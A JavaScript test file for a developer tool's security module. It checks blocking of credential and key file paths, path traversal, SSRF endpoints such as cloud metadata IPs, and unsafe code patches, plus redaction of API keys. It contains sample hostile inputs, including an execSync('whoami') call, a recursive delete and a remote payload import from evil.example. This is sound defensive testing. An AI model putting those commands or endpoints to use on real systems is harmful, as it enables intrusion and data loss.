import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { BailoutEngine } from '../src/engine.js';
import { loadConfig } from '../src/config.js';
import {
  assertSafeWorkspacePath,
  constantTimeEqual,
  isSensitiveFilePath,
  sanitizeConfigForDisplay,
  validateEndpointUrl,
  validatePatchSafety,
} from '../src/security.js';

test('isSensitiveFilePath blocks credential, key, env, database & OS system files while allowing normal code', () => {
  assert.equal(isSensitiveFilePath('/repo/.env'), true);
  assert.equal(isSensitiveFilePath('/repo/.env.production'), true);
  assert.equal(isSensitiveFilePath('/repo/certs/server.pem'), true);
  assert.equal(isSensitiveFilePath('/repo/keys/id_ed25519'), true);
  assert.equal(isSensitiveFilePath('/home/user/.ssh/config'), true);
  assert.equal(isSensitiveFilePath('/home/user/.aws/credentials'), true);
  assert.equal(isSensitiveFilePath('/home/user/.npmrc'), true);
  assert.equal(isSensitiveFilePath('/repo/app.sqlite'), true);
  assert.equal(isSensitiveFilePath('/home/user/.bailout-mcp/bridge.json'), true);

  assert.equal(isSensitiveFilePath('/repo/src/authService.ts'), false);
  assert.equal(isSensitiveFilePath('/repo/src/CartCounter.tsx'), false);
  assert.equal(isSensitiveFilePath('/repo/packages/core/src/config.ts'), false);
});

test('assertSafeWorkspacePath blocks path traversal and outside-workspace access', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bailout-sec-'));
  const inside = path.join(tmpDir, 'src', 'index.ts');
  const outside = path.resolve(tmpDir, '..', 'outside-secret.ts');
  const envFile = path.join(tmpDir, '.env');

  try {
    assert.equal(assertSafeWorkspacePath(inside, [tmpDir]), path.resolve(inside));
    assert.throws(() => assertSafeWorkspacePath(outside, [tmpDir]), /SecurityError/);
    assert.throws(() => assertSafeWorkspacePath(envFile, [tmpDir]), /SecurityError/);
    assert.throws(() => assertSafeWorkspacePath(`${inside}\0.txt`, [tmpDir]), /SecurityError/);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('validateEndpointUrl blocks SSRF metadata IPs, RFC1918 private IPs, 0.0.0.0, embedded creds, and file:// URIs', () => {
  assert.ok(validateEndpointUrl('https://api.anthropic.com/v1/messages'));
  assert.ok(validateEndpointUrl('http://127.0.0.1:11434/api/chat'));
  assert.ok(validateEndpointUrl('http://localhost:4000/v1/chat/completions'));

  assert.throws(() => validateEndpointUrl('http://169.254.169.254/latest/meta-data/'), /SecurityError/);
  assert.throws(() => validateEndpointUrl('https://169.254.169.254/latest/meta-data/'), /SecurityError/);
  assert.throws(() => validateEndpointUrl('https://10.0.0.1/v1/chat'), /SecurityError/);
  assert.throws(() => validateEndpointUrl('https://192.168.1.50/v1/chat'), /SecurityError/);
  assert.throws(() => validateEndpointUrl('https://172.16.0.10/v1/chat'), /SecurityError/);
  assert.throws(() => validateEndpointUrl('http://0.0.0.0:4000/v1/chat'), /SecurityError/);
  assert.throws(() => validateEndpointUrl('https://user:pass@api.anthropic.com/v1'), /SecurityError/);
  assert.throws(() => validateEndpointUrl('http://metadata.google.internal/computeMetadata/v1/'), /SecurityError/);
  assert.throws(() => validateEndpointUrl('http://api.evil-attacker.com/v1/chat'), /SecurityError/);
  assert.throws(() => validateEndpointUrl('file:///etc/passwd'), /SecurityError/);
});

test('validatePatchSafety rejects prompt-injected execution primitives, fs deletion, remote import & oversized rewrites', () => {
  const safe = validatePatchSafety('  setCount(count + 1);', '  setCount((prev) => prev + 1);', 35);
  assert.equal(safe.safe, true);

  assert.equal(validatePatchSafety('const x = 1;', 'const x = eval(userInput);', 35).safe, false);
  assert.equal(
    validatePatchSafety('const x = 1;', 'require("child_process").execSync("whoami");', 35).safe,
    false,
  );
  assert.equal(
    validatePatchSafety('const x = 1;', 'fs.rmSync("/tmp/important", { recursive: true });', 35).safe,
    false,
  );
  assert.equal(
    validatePatchSafety('const x = 1;', 'await import("https://evil.example/payload.mjs");', 35).safe,
    false,
  );
  assert.equal(
    validatePatchSafety('a', Array.from({ length: 40 }, () => 'line').join('\n'), 35).safe,
    false,
  );
});

test('loadConfig reads workspace .env file and updateConfig strips undefined fields without crashing', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bailout-dotenv-'));
  const fakeGemKey = ['AIza', 'SyTestDotEnvKey1234567890'].join('');
  fs.writeFileSync(
    path.join(tmpDir, '.env'),
    `BAILOUT_PROVIDER=gemini\nGEMINI_API_KEY="${fakeGemKey}"\nBAILOUT_STUCK_THRESHOLD=77\n`,
    'utf8',
  );

  try {
    const cfg = loadConfig(undefined, tmpDir);
    assert.equal(cfg.provider, 'gemini');
    assert.equal(cfg.providers.gemini.apiKey, fakeGemKey);
    assert.equal(cfg.stuckThreshold, 77);

    // Regression test for Bug #4: passing undefined optional keys in updateConfig must NOT clobber provider
    const engine = new BailoutEngine({ workspaceRoot: tmpDir });
    const updated = engine.updateConfig({
      provider: undefined,
      stuckThreshold: 82,
      pauseGateMs: undefined,
    });
    assert.equal(updated.provider, 'gemini');
    assert.equal(updated.stuckThreshold, 82);
    assert.equal(engine.getSnapshot().activeProvider, 'gemini');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('loadConfig strips inline .env comments and locks BAILOUT_ALLOWED_ROOTS defined in .env', () => {
  const strictDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bailout-strict-root-'));
  const otherDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bailout-other-root-'));
  fs.writeFileSync(
    path.join(strictDir, '.env'),
    [
      'BAILOUT_PROVIDER=ollama # local offline model',
      'BAILOUT_STUCK_THRESHOLD=68 # custom threshold',
      `BAILOUT_ALLOWED_ROOTS="${strictDir}"`,
    ].join('\n'),
    'utf8',
  );

  try {
    const engine = new BailoutEngine({ workspaceRoot: strictDir });
    assert.equal(engine.getConfig().provider, 'ollama');
    assert.equal(engine.getConfig().stuckThreshold, 68);

    // Signal reporting another workspaceRoot MUST NOT expand locked allowedWorkspaceRoots from .env
    engine.ingest({
      kind: 'file_focus',
      filePath: path.join(strictDir, 'a.ts'),
      workspaceRoot: otherDir,
    });
    assert.deepEqual(engine.getConfig().allowedWorkspaceRoots, [path.resolve(strictDir)]);
  } finally {
    fs.rmSync(strictDir, { recursive: true, force: true });
    fs.rmSync(otherDir, { recursive: true, force: true });
  }
});

test('sanitizeConfigForDisplay never leaks API keys and constantTimeEqual validates accurately', () => {
  const fakeAnt = ['sk', 'ant', 'super-secret-value'].join('-');
  const fakeGem = ['AIza', 'SySecretKey1234567890'].join('');
  const fakeOai = ['sk', 'proj', 'secret1234567890'].join('-');
  const fakeOr = ['sk', 'or', 'v1', 'secret1234567890'].join('-');
  const cfg = loadConfig({
    providers: {
      anthropic: { apiKey: fakeAnt, model: 'claude-opus-4-6' },
      gemini: { apiKey: fakeGem, model: 'gemini-2.5-pro' },
      openai: { apiKey: fakeOai, model: 'o3' },
      openrouter: { apiKey: fakeOr, model: 'anthropic/claude-opus-4.6' },
      ollama: { model: 'qwen2.5-coder:32b', baseUrl: 'http://127.0.0.1:11434/api/chat' },
      custom: { apiKey: 'router-secret', model: 'opus', baseUrl: 'http://127.0.0.1:4000/v1/chat/completions' },
    },
  });

  const serialized = JSON.stringify(sanitizeConfigForDisplay(cfg));
  assert.ok(!serialized.includes(fakeAnt));
  assert.ok(!serialized.includes(fakeGem));
  assert.ok(!serialized.includes(fakeOai));
  assert.ok(!serialized.includes(fakeOr));
  assert.ok(!serialized.includes('router-secret'));

  assert.equal(constantTimeEqual('abc123', 'abc123'), true);
  assert.equal(constantTimeEqual('abc123', 'abc124'), false);
  assert.equal(constantTimeEqual('abc', 'abcdef'), false);
});
